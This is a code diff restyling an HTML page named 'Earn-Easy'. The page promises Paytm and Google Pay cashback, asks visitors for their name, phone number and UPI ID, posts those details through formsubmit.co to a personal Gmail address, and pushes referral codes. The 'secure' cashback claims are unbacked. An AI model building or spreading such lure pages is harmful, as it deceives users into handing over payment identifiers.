@@ -7,43 +7,48 @@
 <style>
 body{
     margin:0;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
-    background:#f5f7fa;
-    color:#1c1e21;
+    font-family:Inter, Arial, sans-serif;
+    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+    color:white;
     display:flex;
     justify-content:center;
     align-items:center;
     min-height:100vh;
 }
 .container{
-    width:460px;
+    width:520px;
     max-width:95%;
-    background:white;
-    padding:30px;
-    border-radius:16px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    background:rgba(255,255,255,0.08);
+    backdrop-filter:blur(15px);
+    padding:35px;
+    border-radius:18px;
+    box-shadow:0 15px 40px rgba(0,0,0,0.4);
 }
 h2{
     margin-top:0;
-    color:#1a73e8;
+    font-weight:600;
+    letter-spacing:0.5px;
 }
 .subtitle{
     font-size:14px;
-    color:#555;
+    opacity:0.8;
     margin-bottom:20px;
 }
 input{
     width:100%;
     padding:14px;
-    margin:10px 0;
+    margin:12px 0;
     border-radius:10px;
-    border:1px solid #dfe3e8;
-    font-size:14px;
+    border:none;
+    background:rgba(255,255,255,0.1);
+    color:white;
+}
+input::placeholder{
+    color:#ccc;
 }
 input:focus{
     outline:none;
-    border-color:#1a73e8;
-    box-shadow:0 0 0 2px rgba(26,115,232,0.15);
+    background:rgba(255,255,255,0.15);
 }
 button{
     width:100%;
@@ -55,60 +60,51 @@ button{
     font-size:15px;
 }
 .primary-btn{
-    background:#1a73e8;
+    background:#00c6ff;
+    background:linear-gradient(90deg,#00c6ff,#0072ff);
     color:white;
 }
 .primary-btn:hover{
-    background:#1669c1;
+    opacity:0.9;
 }
 .hidden{
     display:none;
 }
 .offer-card{
-    border:1px solid #e3e7ed;
-    border-radius:12px;
-    margin-top:15px;
-    overflow:hidden;
+    background:rgba(255,255,255,0.08);
+    border-radius:14px;
+    margin-top:20px;
+    padding:20px;
     transition:0.3s;
 }
-.offer-header{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:16px;
-    cursor:pointer;
+.offer-card:hover{
+    background:rgba(255,255,255,0.12);
 }
 .offer-title{
-    display:flex;
-    align-items:center;
-    gap:10px;
+    font-size:16px;
     font-weight:600;
+    margin-bottom:8px;
 }
-.offer-content{
-    background:#f9fbfd;
-    padding:16px;
-    display:none;
-    font-size:14px;
-    color:#444;
+.brand{
+    font-weight:bold;
+    font-size:15px;
 }
-.logo{
-    width:26px;
-    height:26px;
+.paytm{
+    color:#00baf2;
+}
+.gpay{
+    color:#34a853;
 }
 .rules{
+    font-size:13px;
     line-height:1.6;
-}
-.badge{
-    background:#e8f0fe;
-    color:#1a73e8;
-    padding:4px 8px;
-    border-radius:20px;
-    font-size:12px;
+    opacity:0.9;
+    margin-top:10px;
 }
 .footer-note{
-    margin-top:15px;
+    margin-top:20px;
     font-size:12px;
-    color:#777;
+    opacity:0.6;
 }
 </style>
 </head>
@@ -120,7 +116,7 @@ button{
 <div id="step1">
     <h2>Earn-Easy</h2>
     <div class="subtitle">
-        Enter your details to access available cashback offers.
+        Secure cashback portal. Enter your details to continue.
     </div>
 
     <input type="text" id="name" placeholder="Full Name">
@@ -130,7 +126,7 @@ button{
     <button class="primary-btn" onclick="validateAndContinue()">Continue</button>
 
     <div class="footer-note">
-        Your details are used only for cashback verification.
+        Details are used only for cashback verification.
     </div>
 </div>
 
@@ -138,50 +134,44 @@ button{
 
     <!-- PAYTM -->
     <div class="offer-card">
-        <div class="offer-header" onclick="toggleOffer('paytm')">
-            <div class="offer-title">
-                <span class="badge">₹50</span>
-                Paytm Cashback
-            </div>
-            ▼
+        <div class="offer-title">
+            <span class="brand paytm">Paytm</span> – ₹50 Cashback
         </div>
-        <div id="paytm" class="offer-content">
-            <div class="rules">
-                • New Paytm users only<br>
-                • Complete full registration<br>
-                • Send ₹10 after signup<br>
-                • Cashback processed within 24–48 hours<br>
-                • Duplicate accounts not accepted
-            </div>
-            <button class="primary-btn" onclick="confirmOffer('Paytm','https://p.paytm.me/xCTH/ueupfch7?utmt=021222')">
-                Agree & Continue
-            </button>
+
+        <div class="rules">
+            • NEW Paytm users only<br>
+            • Referral Code: <b>9741237240</b><br>
+            • Send ₹10 after signup<br>
+            • Cashback within 24–48 hours<br>
+            • Duplicate accounts rejected
         </div>
+
+        <button class="primary-btn"
+        onclick="confirmOffer('Paytm','https://p.paytm.me/xCTH/ueupfch7?utmt=021222')">
+            Agree & Continue
+        </button>
     </div>
 
     <!-- GOOGLE PAY -->
     <div class="offer-card">
-        <div class="offer-header" onclick="toggleOffer('gpay')">
-            <div class="offer-title">
-                <span class="badge">₹50 + ₹50</span>
-                Google Pay Cashback
-            </div>
-            ▼
+        <div class="offer-title">
+            <span class="brand gpay">Google Pay</span> – ₹50 + ₹50 Bonus
         </div>
-        <div id="gpay" class="offer-content">
-            <div class="rules">
-                • NEW Google Pay account only<br>
-                • Use Invite Code: <b>n781m0d</b><br>
-                • Send minimum ₹1 after signup<br>
-                • ₹50 cashback after verification<br><br>
-                <b>Bonus:</b><br>
-                • 4 transactions per week for 4 weeks<br>
-                • Extra ₹50 after completion
-            </div>
-            <button class="primary-btn" onclick="confirmOffer('Google Pay','https://gpay.app.goo.gl/invite-n781m0d')">
-                Agree & Continue
-            </button>
+
+        <div class="rules">
+            • NEW Google Pay account only<br>
+            • Invite Code: <b>n781m0d</b><br>
+            • Send minimum ₹1 after signup<br>
+            • ₹50 cashback after verification<br><br>
+            <b>Bonus:</b><br>
+            • 4 transactions/week for 4 weeks<br>
+            • Extra ₹50 after completion
         </div>
+
+        <button class="primary-btn"
+        onclick="confirmOffer('Google Pay','https://gpay.app.goo.gl/invite-n781m0d')">
+            Agree & Continue
+        </button>
     </div>
 
 </div>
@@ -201,12 +191,12 @@ function validateAndContinue(){
     }
 
     if(phone.length !== 10 || isNaN(phone)){
-        alert("Enter a valid 10 digit phone number.");
+        alert("Enter valid 10 digit phone number.");
         return;
     }
 
     if(!upi.includes("@")){
-        alert("Enter a valid UPI ID.");
+        alert("Enter valid UPI ID.");
         return;
     }
 
@@ -214,13 +204,7 @@ function validateAndContinue(){
     document.getElementById("step2").classList.remove("hidden");
 }
 
-function toggleOffer(id){
-    let el = document.getElementById(id);
-    el.style.display = el.style.display === "block" ? "none" : "block";
-}
-
 function confirmOffer(offer, link){
-
     fetch("https://formsubmit.co/ajax/earneasy2026@gmail.com",{
         method:"POST",
         headers:{
